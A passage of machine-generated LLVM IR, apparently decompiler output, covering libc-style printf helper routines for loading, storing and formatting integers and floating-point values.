  %v0_80555bd.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80555bd

dec_label_pc_80555bd:                             ; preds = %dec_label_pc_805559e.dec_label_pc_80555bd_crit_edge, %dec_label_pc_8055599, %dec_label_pc_805558c
  %v2_80555c2 = phi i32 [ %v0_80555bd.pre, %dec_label_pc_805559e.dec_label_pc_80555bd_crit_edge ], [ %v0_80555b0, %dec_label_pc_8055599 ], [ %v0_80555b0, %dec_label_pc_805558c ]
  %v1_80555bd = inttoptr i32 %v2_80555c2 to i32*
  %v2_80555bd = load i32, i32* %v1_80555bd, align 4
  %v1_80555bf = and i32 %v2_80555bd, -4
  store i32 %v1_80555bf, i32* %eax.global-to-local, align 4
  %v1_80555c2 = trunc i32 %v1_80555bf to i16
  %v3_80555c2 = inttoptr i32 %v2_80555c2 to i16*
  store i16 %v1_80555c2, i16* %v3_80555c2, align 2
  %v0_80555c5 = load i32, i32* @ebx, align 4
  %v1_80555c5 = add i32 %v0_80555c5, 8
  %v2_80555c5 = inttoptr i32 %v1_80555c5 to i32*
  %v3_80555c5 = load i32, i32* %v2_80555c5, align 4
  store i32 %v3_80555c5, i32* %eax.global-to-local, align 4
  %v2_80555c8 = add i32 %v0_80555c5, 24
  %v3_80555c8 = inttoptr i32 %v2_80555c8 to i32*
  store i32 %v3_80555c5, i32* %v3_80555c8, align 4
  %v0_80555cb = load i32, i32* %eax.global-to-local, align 4
  %v1_80555cb = load i32, i32* @ebx, align 4
  %v2_80555cb = add i32 %v1_80555cb, 16
  %v3_80555cb = inttoptr i32 %v2_80555cb to i32*
  store i32 %v0_80555cb, i32* %v3_80555cb, align 4
  %v0_80555ce = load i32, i32* %eax.global-to-local, align 4
  %v1_80555ce = load i32, i32* @ebx, align 4
  %v2_80555ce = add i32 %v1_80555ce, 20
  %v3_80555ce = inttoptr i32 %v2_80555ce to i32*
  store i32 %v0_80555ce, i32* %v3_80555ce, align 4
  %v0_80555d1.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80555d1

dec_label_pc_80555d1:                             ; preds = %dec_label_pc_8055587, %dec_label_pc_80555bd
  %v2_80555d8 = phi i32 [ %v0_80555b0, %dec_label_pc_8055587 ], [ %v0_80555d1.pre, %dec_label_pc_80555bd ]
  %v1_80555d1 = inttoptr i32 %v2_80555d8 to i32*
  %v2_80555d1 = load i32, i32* %v1_80555d1, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80555d5 = or i32 %v2_80555d1, 64
  store i32 %v1_80555d5, i32* %eax.global-to-local, align 4
  %v1_80555d8 = trunc i32 %v1_80555d5 to i16
  %v3_80555d8 = inttoptr i32 %v2_80555d8 to i16*
  store i16 %v1_80555d8, i16* %v3_80555d8, align 2
  %v0_80555db = load i32, i32* %eax.global-to-local, align 4
  %v1_80555db = urem i32 %v0_80555db, 65536
  store i32 %v1_80555db, i32* %eax.global-to-local, align 4
  %v3_80555de = and i32 %v0_80555db, 2816
  %v4_80555de = icmp eq i32 %v3_80555de, 0
  %v1_80555e1 = icmp eq i1 %v4_80555de, false
  br i1 %v1_80555e1, label %dec_label_pc_80555e9, label %dec_label_pc_80555e3

dec_label_pc_80555e3:                             ; preds = %dec_label_pc_80555d1
  %v0_80555e3 = load i32, i32* @ebx, align 4
  %v1_80555e3 = add i32 %v0_80555e3, 12
  %v2_80555e3 = inttoptr i32 %v1_80555e3 to i32*
  %v3_80555e3 = load i32, i32* %v2_80555e3, align 4
  store i32 %v3_80555e3, i32* %eax.global-to-local, align 4
  %v2_80555e6 = add i32 %v0_80555e3, 28
  %v3_80555e6 = inttoptr i32 %v2_80555e6 to i32*
  store i32 %v3_80555e3, i32* %v3_80555e6, align 4
  br label %dec_label_pc_80555e9

dec_label_pc_80555e9:                             ; preds = %dec_label_pc_80555d1, %dec_label_pc_805557a, %dec_label_pc_80555e3
  %v0_80555e9 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_80555e9, i32* %eax.global-to-local, align 4
  %v2_80555eb = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80555eb, i32* %edx.global-to-local, align 4
  store i32 %v0_8055548, i32* @ebx, align 4
  ret i32 %v0_80555e9

; uselistorder directives
  uselistorder i32 %v0_80555db, { 1, 0 }
  uselistorder i32 %v1_805559e, { 1, 0, 2 }
  uselistorder i32 %v0_80555b0, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v3_8055554, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8055548, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i32 1024, { 0, 12, 4, 7, 6, 13, 5, 2, 3, 10, 9, 1, 11, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80555e9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80555d1, { 1, 0 }
  uselistorder label %dec_label_pc_8055567, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %v5_80555f0 = icmp slt i32 %tmp5, 0
  %v3_8055621 = and i32 %tmp4, 2048
  %v4_8055621 = icmp eq i32 %v3_8055621, 0
  br i1 %v5_80555f0, label %dec_label_pc_8055621, label %dec_label_pc_80555ff

dec_label_pc_80555ff:                             ; preds = %entry
  %v1_8055602 = icmp eq i1 %v4_8055621, false
  br i1 %v1_8055602, label %dec_label_pc_8055626, label %dec_label_pc_8055604

dec_label_pc_8055604:                             ; preds = %dec_label_pc_80555ff
  %v6_8055604 = icmp eq i32 %tmp4, 256
  %v1_805560a = inttoptr i32 %tmp to i32*
  %v2_805560a = load i32, i32* %v1_805560a, align 4
  %v1_805560c = icmp eq i1 %v6_8055604, false
  br i1 %v1_805560c, label %dec_label_pc_8055613, label %dec_label_pc_805560e

dec_label_pc_805560e:                             ; preds = %dec_label_pc_8055604
  %v1_805560e = urem i32 %v2_805560a, 256
  br label %dec_label_pc_805561e

dec_label_pc_8055613:                             ; preds = %dec_label_pc_8055604
  %v6_8055613 = icmp eq i32 %tmp4, 512
  %v1_8055619 = icmp eq i1 %v6_8055613, false
  br i1 %v1_8055619, label %dec_label_pc_805561e, label %dec_label_pc_805561b

dec_label_pc_805561b:                             ; preds = %dec_label_pc_8055613
  %v1_805561b = urem i32 %v2_805560a, 65536
  br label %dec_label_pc_805561e

dec_label_pc_805561e:                             ; preds = %dec_label_pc_8055613, %dec_label_pc_805560e, %dec_label_pc_805561b
  %v0_8055620 = phi i32 [ %v2_805560a, %dec_label_pc_8055613 ], [ %v1_805560e, %dec_label_pc_805560e ], [ %v1_805561b, %dec_label_pc_805561b ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_8055620

dec_label_pc_8055621:                             ; preds = %entry
  br i1 %v4_8055621, label %dec_label_pc_805562c, label %dec_label_pc_8055626

dec_label_pc_8055626:                             ; preds = %dec_label_pc_8055621, %dec_label_pc_80555ff
  %v1_8055626 = add i32 %tmp, 4
  %v2_8055626 = inttoptr i32 %v1_8055626 to i32*
  %v3_8055626 = load i32, i32* %v2_8055626, align 4
  store i32 %v3_8055626, i32* @edx, align 4
  %v1_8055629 = inttoptr i32 %tmp to i32*
  %v2_8055629 = load i32, i32* %v1_8055629, align 4
  ret i32 %v2_8055629

dec_label_pc_805562c:                             ; preds = %dec_label_pc_8055621
  %v6_805562c = icmp eq i32 %tmp4, 256
  %v1_8055632 = inttoptr i32 %tmp to i32*
  %v2_8055632 = load i32, i32* %v1_8055632, align 4
  %v1_8055634 = icmp eq i1 %v6_805562c, false
  br i1 %v1_8055634, label %dec_label_pc_805563b, label %dec_label_pc_8055636

dec_label_pc_8055636:                             ; preds = %dec_label_pc_805562c
  %v1_8055636 = mul i32 %v2_8055632, 16777216
  %v2_8055636 = sdiv i32 %v1_8055636, 16777216
  br label %dec_label_pc_8055644

dec_label_pc_805563b:                             ; preds = %dec_label_pc_805562c
  %v6_805563b = icmp eq i32 %tmp4, 512
  %v1_8055641 = icmp eq i1 %v6_805563b, false
  br i1 %v1_8055641, label %dec_label_pc_8055644, label %dec_label_pc_8055643

dec_label_pc_8055643:                             ; preds = %dec_label_pc_805563b
  %v1_8055643 = mul i32 %v2_8055632, 65536
  %v2_8055643 = sdiv i32 %v1_8055643, 65536
  br label %dec_label_pc_8055644

dec_label_pc_8055644:                             ; preds = %dec_label_pc_805563b, %dec_label_pc_8055636, %dec_label_pc_8055643
  %v0_8055644 = phi i32 [ %v2_8055632, %dec_label_pc_805563b ], [ %v2_8055636, %dec_label_pc_8055636 ], [ %v2_8055643, %dec_label_pc_8055643 ]
  %v1_8055644 = ashr i32 %v0_8055644, 31
  store i32 %v1_8055644, i32* @edx, align 4
  ret i32 %v0_8055644

; uselistorder directives
  uselistorder i32 %v0_8055644, { 1, 0 }
  uselistorder i32 %v2_8055632, { 2, 0, 1 }
  uselistorder i32 %v2_805560a, { 2, 0, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8055644, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805561e, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_6()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8055648 = load i32, i32* @ebx, align 4
  store i32 %v0_8055648, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_805564d = ptrtoint i16* %tmp5 to i32
  store i32 %v4_805564d, i32* %ebx.global-to-local, align 4
  %v4_8055651 = trunc i32 %tmp4 to i16
  %v6_8055659 = icmp eq i32 %tmp6, 256
  %v1_805565f = icmp eq i1 %v6_8055659, false
  br i1 %v1_805565f, label %dec_label_pc_8055665, label %dec_label_pc_8055661

dec_label_pc_8055661:                             ; preds = %entry
  %v2_8055661 = trunc i32 %tmp4 to i8
  %v4_8055661 = bitcast i16* %tmp5 to i8*
  store i8 %v2_8055661, i8* %v4_8055661, align 1
  br label %dec_label_pc_8055683

dec_label_pc_8055665:                             ; preds = %entry
  %v6_8055665 = icmp eq i32 %tmp6, 2048
  %v1_805566b = icmp eq i1 %v6_8055665, false
  br i1 %v1_805566b, label %dec_label_pc_8055674, label %dec_label_pc_805566d

dec_label_pc_805566d:                             ; preds = %dec_label_pc_8055665
  %sext2 = mul i32 %tmp4, 65536
  %v1_805566d = sdiv i32 %sext2, 65536
  %v3_805566d = bitcast i16* %tmp5 to i32*
  store i32 %v1_805566d, i32* %v3_805566d, align 4
  %v0_805566f = load i32, i32* %edx.global-to-local, align 4
  %v1_805566f = load i32, i32* %ebx.global-to-local, align 4
  %v2_805566f = add i32 %v1_805566f, 4
  %v3_805566f = inttoptr i32 %v2_805566f to i32*
  store i32 %v0_805566f, i32* %v3_805566f, align 4
  br label %dec_label_pc_8055683

dec_label_pc_8055674:                             ; preds = %dec_label_pc_8055665
  %v6_8055674 = icmp eq i32 %tmp6, 512
  %v1_805567a = icmp eq i1 %v6_8055674, false
  br i1 %v1_805567a, label %dec_label_pc_8055681, label %dec_label_pc_805567c

dec_label_pc_805567c:                             ; preds = %dec_label_pc_8055674
  store i16 %v4_8055651, i16* %tmp5, align 2
  br label %dec_label_pc_8055683

dec_label_pc_8055681:                             ; preds = %dec_label_pc_8055674
  %sext3 = mul i32 %tmp4, 65536
  %v1_8055681 = sdiv i32 %sext3, 65536
  %v3_8055681 = bitcast i16* %tmp5 to i32*
  store i32 %v1_8055681, i32* %v3_8055681, align 4
  br label %dec_label_pc_8055683

dec_label_pc_8055683:                             ; preds = %dec_label_pc_805567c, %dec_label_pc_805566d, %dec_label_pc_8055661, %dec_label_pc_8055681
  %v2_8055683 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055683, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_8055684 = sdiv i32 %sext, 65536
  ret i32 %v1_8055684

; uselistorder directives
  uselistorder label %dec_label_pc_8055683, { 3, 0, 1, 2 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_8055693 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055693, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_805569f = icmp slt i32 %arg4, 0
  %v1_80556a1 = icmp eq i1 %v2_805569f, false
  br i1 %v1_80556a1, label %dec_label_pc_80556c2, label %dec_label_pc_80556a3

dec_label_pc_80556a3:                             ; preds = %entry
  %v1_80556a3 = sub i32 0, %arg4
  store i32 %v1_80556a3, i32* %esi.global-to-local, align 4
  %v2_80556a5 = icmp slt i32 %arg3, 0
  %v1_80556a7 = icmp eq i1 %v2_80556a5, false
  br i1 %v1_80556a7, label %dec_label_pc_80556c2, label %dec_label_pc_80556a9

dec_label_pc_80556a9:                             ; preds = %dec_label_pc_80556a3
  %v1_80556a9 = sub i32 0, %arg2
  %v5_80556a9 = icmp ne i32 %arg2, 0
  store i32 %v1_80556a9, i32* %ecx.global-to-local, align 4
  %v2_80556ab = zext i1 %v5_80556a9 to i32
  %v3_80556ab = add i32 %v2_80556ab, %arg3
  %v1_80556ae = sub i32 0, %v3_80556ab
  store i32 %v1_80556ae, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80556c2

dec_label_pc_80556c2:                             ; preds = %entry, %dec_label_pc_80556a3, %dec_label_pc_80556a9
  %v0_80556c7 = phi i32 [ %v1_80556a3, %dec_label_pc_80556a9 ], [ %v1_80556a3, %dec_label_pc_80556a3 ], [ %arg4, %entry ]
  %storemerge11 = phi i32 [ 1, %dec_label_pc_80556a9 ], [ 0, %dec_label_pc_80556a3 ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_80556c7
  %tmp30 = urem i32 -1, %v0_80556c7
  store i8 0, i8* %arg1, align 1
  %v1_80556cc = add i32 %tmp30, 1
  %v1_80556cd = load i32, i32* %esi.global-to-local, align 4
  %v12_80556cd = icmp eq i32 %v1_80556cc, %v1_80556cd
  %v1_80556d7 = icmp eq i1 %v12_80556cd, false
  br i1 %v1_80556d7, label %dec_label_pc_80556e6, label %dec_label_pc_80556d9

dec_label_pc_80556d9:                             ; preds = %dec_label_pc_80556c2
  %v1_80556d9 = add i32 %div, 1
  br label %dec_label_pc_80556e6

dec_label_pc_80556e6:                             ; preds = %dec_label_pc_80556c2, %dec_label_pc_80556d9
  %stack_var_-20.0.off0 = phi i32 [ %v1_80556cc, %dec_label_pc_80556c2 ], [ 0, %dec_label_pc_80556d9 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_80556c2 ], [ %v1_80556d9, %dec_label_pc_80556d9 ]
  %v0_80556e6 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80556e6, i32* %ebp.global-to-local, align 4
  %v0_80556e8 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_80556e8, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80556ec

dec_label_pc_80556ec:                             ; preds = %dec_label_pc_805573a, %dec_label_pc_80556e6
  %v0_8055723 = phi i32 [ %v0_805573c, %dec_label_pc_805573a ], [ %v0_80556e6, %dec_label_pc_80556e6 ]
  %v0_80556f0 = phi i32 [ %v1_805573e, %dec_label_pc_805573a ], [ %v0_80556e8, %dec_label_pc_80556e6 ]
  %v1_80556ec = icmp eq i32 %v0_80556f0, 0
  br i1 %v1_80556ec, label %dec_label_pc_8055723, label %dec_label_pc_80556f0

dec_label_pc_80556f0:                             ; preds = %dec_label_pc_80556ec
  %v0_80556f4 = load i32, i32* %esi.global-to-local, align 4
  %div6 = udiv i32 %v0_80556f0, %v0_80556f4
  %tmp31 = urem i32 %v0_80556f0, %v0_80556f4
  store i32 %div6, i32* %ebx.global-to-local, align 4
  %div7 = udiv i32 %v0_8055723, %v0_80556f4
  %tmp32 = urem i32 %v0_8055723, %v0_80556f4
  store i32 %div7, i32* %ebp.global-to-local, align 4
  %v6_8055707 = mul i32 %tmp31, %stack_var_-20.0.off0
  %v2_805570b = add i32 %tmp32, %v6_8055707
  %v8_8055711 = mul i32 %tmp31, %stack_var_-24.0.in
  %v2_8055716 = add i32 %div7, %v8_8055711
  store i32 %v2_8055716, i32* %ecx.global-to-local, align 4
  %div8 = udiv i32 %v2_805570b, %v0_80556f4
  %tmp33 = urem i32 %v2_805570b, %v0_80556f4
  %v2_805571e = add i32 %div8, %v2_8055716
  br label %dec_label_pc_805572b

dec_label_pc_8055723:                             ; preds = %dec_label_pc_80556ec
  %v0_8055727 = load i32, i32* %esi.global-to-local, align 4
  %div10 = udiv i32 %v0_8055723, %v0_8055727
  %tmp34 = urem i32 %v0_8055723, %v0_8055727
  br label %dec_label_pc_805572b

dec_label_pc_805572b:                             ; preds = %dec_label_pc_80556f0, %dec_label_pc_8055723
  %v13_8055731 = phi i32 [ %tmp33, %dec_label_pc_80556f0 ], [ %tmp34, %dec_label_pc_8055723 ]
  %storemerge = phi i32 [ %v2_805571e, %dec_label_pc_80556f0 ], [ %div10, %dec_label_pc_8055723 ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_805572b = load i32, i32* %edi.global-to-local, align 4
  %v1_805572b = add i32 %v0_805572b, -1
  store i32 %v1_805572b, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8055731, 10
  br i1 %tmp, label %dec_label_pc_8055731, label %dec_label_pc_8055736

dec_label_pc_8055731:                             ; preds = %dec_label_pc_805572b
  %v2_8055731 = add i32 %v13_8055731, 48
  %v12_8055731 = and i32 %v2_8055731, 255
  %v14_8055731 = and i32 %v13_8055731, -256
  %v15_8055731 = or i32 %v12_8055731, %v14_8055731
  br label %dec_label_pc_805573a

dec_label_pc_8055736:                             ; preds = %dec_label_pc_805572b
  %v6_8055736 = add i32 %v13_8055731, %arg5
  %v21_8055736 = and i32 %v6_8055736, 255
  %v23_8055736 = and i32 %v13_8055731, -256
  %v24_8055736 = or i32 %v21_8055736, %v23_8055736
  br label %dec_label_pc_805573a

dec_label_pc_805573a:                             ; preds = %dec_label_pc_8055731, %dec_label_pc_8055736
  %storemerge9 = phi i32 [ %v15_8055731, %dec_label_pc_8055731 ], [ %v24_8055736, %dec_label_pc_8055736 ]
  %v1_805573a = trunc i32 %storemerge9 to i8
  %v3_805573a = inttoptr i32 %v1_805572b to i8*
  store i8 %v1_805573a, i8* %v3_805573a, align 1
  %v0_805573c = load i32, i32* %ebp.global-to-local, align 4
  %v1_805573e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805573e = or i32 %v1_805573e, %v0_805573c
  %v3_805573e = icmp eq i32 %v2_805573e, 0
  %v1_8055740 = icmp eq i1 %v3_805573e, false
  br i1 %v1_8055740, label %dec_label_pc_80556ec, label %dec_label_pc_8055742

dec_label_pc_8055742:                             ; preds = %dec_label_pc_805573a
  %v4_8055742 = icmp eq i32 %storemerge11, 0
  br i1 %v4_8055742, label %dec_label_pc_805574d, label %dec_label_pc_8055749

dec_label_pc_8055749:                             ; preds = %dec_label_pc_8055742
  %v0_8055749 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055749 = add i32 %v0_8055749, -1
  store i32 %v1_8055749, i32* %edi.global-to-local, align 4
  %v1_805574a = inttoptr i32 %v1_8055749 to i8*
  store i8 45, i8* %v1_805574a, align 1
  br label %dec_label_pc_805574d

dec_label_pc_805574d:                             ; preds = %dec_label_pc_8055742, %dec_label_pc_8055749
  %v0_8055750 = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055750

; uselistorder directives
  uselistorder i32 %v13_8055731, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_805570b, { 1, 0 }
  uselistorder i32 %v0_80556f4, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_80556f0, { 1, 0, 2 }
  uselistorder i32 %v0_8055723, { 1, 0, 3, 2 }
  uselistorder i32 %v1_80556cc, { 1, 0 }
  uselistorder i32 %v0_80556c7, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805574d, { 1, 0 }
  uselistorder label %dec_label_pc_805573a, { 1, 0 }
  uselistorder label %dec_label_pc_805572b, { 1, 0 }
  uselistorder label %dec_label_pc_80556e6, { 1, 0 }
  uselistorder label %dec_label_pc_80556c2, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_5()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055759 = load i32, i32* @edi, align 4
  %v0_805575a = load i32, i32* @esi, align 4
  %v0_805575b = load i32, i32* @ebx, align 4
  store i32 %v0_805575b, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8055770 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8055770 = add i3 %v4_8055770, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8055770, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055777 = add i32 %tmp156, 4
  %v2_8055777 = inttoptr i32 %v1_8055777 to i32*
  %v3_8055777 = load i32, i32* %v2_8055777, align 4
  store i32 %v3_8055777, i32* %eax.global-to-local, align 4
  %v1_805577e = add i32 %tmp156, 8
  %v2_805577e = inttoptr i32 %v1_805577e to i8*
  %v3_805577e = load i8, i8* %v2_805577e, align 1
  %v4_805577e = zext i8 %v3_805577e to i32
  %v6_805577e = and i32 %v0_805575b, -256
  %v7_805577e = or i32 %v4_805577e, %v6_805577e
  store i32 %v7_805577e, i32* %ebx.global-to-local, align 4
  %v1_8055781 = inttoptr i32 %tmp156 to i32*
  %v2_8055781 = load i32, i32* %v1_8055781, align 4
  store i32 %v2_8055781, i32* %ebp.global-to-local, align 4
  %v2_805578d = or i8 %v3_805577e, 32
  %v7_805578d = zext i8 %v2_805578d to i32
  %v9_805578d = and i32 %v3_8055777, -256
  %v10_805578d = or i32 %v7_805578d, %v9_805578d
  store i32 %v10_805578d, i32* %eax.global-to-local, align 4
  %v10_805578f = icmp eq i8 %v2_805578d, 97
  %v1_8055795 = icmp eq i1 %v10_805578f, false
  br i1 %v1_8055795, label %dec_label_pc_805579e, label %dec_label_pc_8055797

dec_label_pc_8055797:                             ; preds = %entry
  %v2_8055797 = add i8 %v3_805577e, 6
  %v15_8055797 = zext i8 %v2_8055797 to i32
  %v18_8055797 = or i32 %v15_8055797, %v6_805577e
  store i32 %v18_8055797, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805579e

dec_label_pc_805579e:                             ; preds = %entry, %dec_label_pc_8055797
  %stack_var_-207.0 = phi i8 [ %v3_805577e, %entry ], [ %v2_8055797, %dec_label_pc_8055797 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_80557a5 = icmp slt i32 %v2_8055781, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_80557b4 = select i1 %v2_80557a5, i32 6, i32 %v2_8055781
  store i32 %v3_80557b4, i32* %ebp.global-to-local, align 4
  %v1_80557b7 = add i32 %tmp156, 12
  %v2_80557b7 = inttoptr i32 %v1_80557b7 to i32*
  %v3_80557b7 = load i32, i32* %v2_80557b7, align 4
  store i32 %v3_80557b7, i32* %eax.global-to-local, align 4
  %v2_80557ba = and i32 %v3_80557b7, 2
  %v3_80557ba = icmp eq i32 %v2_80557ba, 0
  br i1 %v3_80557ba, label %dec_label_pc_80557c8, label %dec_label_pc_80557d4

dec_label_pc_80557c8:                             ; preds = %dec_label_pc_805579e
  %v2_80557c8 = urem i32 %v3_80557b7, 2
  %tmp192 = trunc i32 %v2_80557c8 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_80557d4

dec_label_pc_80557d4:                             ; preds = %dec_label_pc_80557c8, %dec_label_pc_805579e
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_805579e ], [ %tmp193, %dec_label_pc_80557c8 ]
  %not.v5_80557d4 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_80557d4, label %dec_label_pc_805584b, label %dec_label_pc_80557f6

dec_label_pc_80557f6:                             ; preds = %dec_label_pc_80557d4
  %v1_80557f6 = add i3 %v4_8055770, -2
  store i3 %v1_80557f6, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_80557fa = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_80557fa, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_80557f6
  br label %dec_label_pc_8055886

bb180:                                            ; preds = %dec_label_pc_80557f6
  %v5_80557fa = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_80557fa, label %bb181, label %dec_label_pc_80557fe

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_8055886

dec_label_pc_80557fe:                             ; preds = %bb180
  %not.v4_80557f8 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_80557f8, label %dec_label_pc_8055886, label %dec_label_pc_805591b

dec_label_pc_805584b:                             ; preds = %dec_label_pc_80557d4
  store i3 %v4_8055770, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8055852 = add i32 %tmp156, 16
  %v2_8055852 = inttoptr i32 %v1_8055852 to i32*
  store i32 32, i32* %v2_8055852, align 4
  %v4_8055859 = add i8 %stack_var_-207.0, -96
  %v6_8055859 = sub i8 95, %stack_var_-207.0
  %v7_8055859 = and i8 %v6_8055859, %stack_var_-207.0
  %v8_8055859 = icmp slt i8 %v7_8055859, 0
  %v9_8055859 = icmp eq i8 %v4_8055859, 0
  %v10_8055859 = icmp slt i8 %v4_8055859, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_805586e = icmp eq i1 %v10_8055859, %v8_8055859
  %v4_805586e = icmp eq i1 %v9_8055859, false
  %v5_805586e = and i1 %v4_805586e, %v3_805586e
  br i1 %v5_805586e, label %dec_label_pc_8055875, label %dec_label_pc_8055870

dec_label_pc_8055870:                             ; preds = %dec_label_pc_805584b
  br label %dec_label_pc_8055875

dec_label_pc_8055875:                             ; preds = %dec_label_pc_805584b, %dec_label_pc_8055870
  %v2_805587d = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_805587d, i32* @ecx, align 4
  br label %dec_label_pc_8055c46

dec_label_pc_8055886:                             ; preds = %dec_label_pc_80557fe, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_80558a0 = xor i3 %v4_8055770, -4
  store i3 %v3_80558a0, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80558a6

dec_label_pc_80558a6:                             ; preds = %dec_label_pc_80558f7, %dec_label_pc_8055886
  %v0_80558f7 = phi i32 [ 4096, %dec_label_pc_8055886 ], [ %v2_80558f7, %dec_label_pc_80558f7 ]
  %v2_80558a9 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8055886 ], [ %v2_80558a981, %dec_label_pc_80558f7 ]
  %v1_80558e1 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_8055886 ], [ %v0_80558a679, %dec_label_pc_80558f7 ]
